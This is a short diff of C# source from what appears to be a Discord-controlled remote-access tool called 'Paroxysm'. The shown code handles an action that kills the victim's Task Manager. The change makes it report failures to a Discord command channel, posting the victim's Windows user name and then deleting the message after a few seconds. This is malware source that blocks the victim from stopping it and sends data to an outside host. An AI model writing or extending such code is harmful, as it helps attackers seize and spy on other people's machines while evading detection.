@@ -1,6 +1,7 @@
 ﻿using System.ComponentModel;
 using System.Diagnostics;
-using Paroxysm.Debug;
+using Discord;
+using Paroxysm.API;
 using Paroxysm.Tools;
 
 namespace Paroxysm.Hooks.Actions;
@@ -26,9 +27,12 @@ public static class TaskManagerAction
                 taskMgr.WaitForExit(1000);
                 taskMgr.Close();
             }
-            catch (Exception err)
+            catch
             {
-                Logger.CreateEmbed(ELoggerState.Error, err);
+                var embed = EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+                    "Cannot kill task manager process.", Environment.UserName, null);
+                var message = DiscordStatement.CurrentChannel.SendMessageAsync(null, false, embed).Result;
+                Task.Run(() => DiscordStatement.CurrentChannel.DeleteMessageAsync(message)).Wait(10000);
             }
         }
     }
